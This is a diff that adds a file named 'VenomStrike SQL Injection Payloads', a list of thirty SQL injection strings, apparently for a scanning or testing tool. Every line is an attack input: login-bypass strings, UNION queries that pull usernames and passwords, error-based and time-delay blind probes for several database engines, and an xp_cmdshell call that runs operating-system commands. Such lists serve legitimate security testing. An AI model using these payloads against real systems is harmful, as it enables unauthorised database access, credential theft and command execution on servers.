@@ -1,0 +1,31 @@
+# VenomStrike SQL Injection Payloads
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+" OR 1=1--
+' OR 1=1#
+admin'--
+1' ORDER BY 1--
+1' ORDER BY 10--
+1' UNION SELECT NULL--
+1' UNION SELECT NULL,NULL--
+1' UNION SELECT NULL,NULL,NULL--
+1 UNION SELECT 1,2,3--
+' AND 1=CONVERT(int,(SELECT @@version))--
+1;SELECT * FROM users
+' OR ''='
+') OR ('1'='1
+1' AND '1'='1
+1' AND '1'='2
+1 OR 1=1
+' OR '1'='1'/*
+' AND SLEEP(5)--
+' OR pg_sleep(5)--
+' WAITFOR DELAY '0:0:5'--
+1' AND (SELECT COUNT(*) FROM sysobjects)>0--
+' UNION SELECT username,password FROM users--
+1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--
+' OR 1=1 LIMIT 1--
+admin' AND '1'='1
+' OR BENCHMARK(5000000,SHA1('test'))--
+1;EXEC xp_cmdshell('dir')--
